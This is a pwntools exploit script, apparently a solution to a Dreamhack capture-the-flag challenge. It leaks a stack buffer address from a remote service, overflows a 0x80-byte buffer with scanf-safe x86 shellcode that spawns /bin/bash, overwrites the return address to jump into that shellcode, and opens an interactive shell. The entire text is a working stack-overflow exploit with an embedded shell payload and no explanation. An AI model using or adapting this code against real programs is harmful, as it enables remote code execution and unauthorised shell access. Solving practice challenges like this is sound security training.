from pwn import *

r = remote("host8.dreamhack.games", 18386)

r.recvuntil("buf = (")
buf_adr = int(r.recvline()[:-2], 16)

scanf_shell = b'\x31\xc0\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80'

payload = scanf_shell
payload += b'A' * (0x80 - len(scanf_shell))
payload += b'B' * 0x4
payload += p32(buf_adr)

r.send(payload)

r.interactive()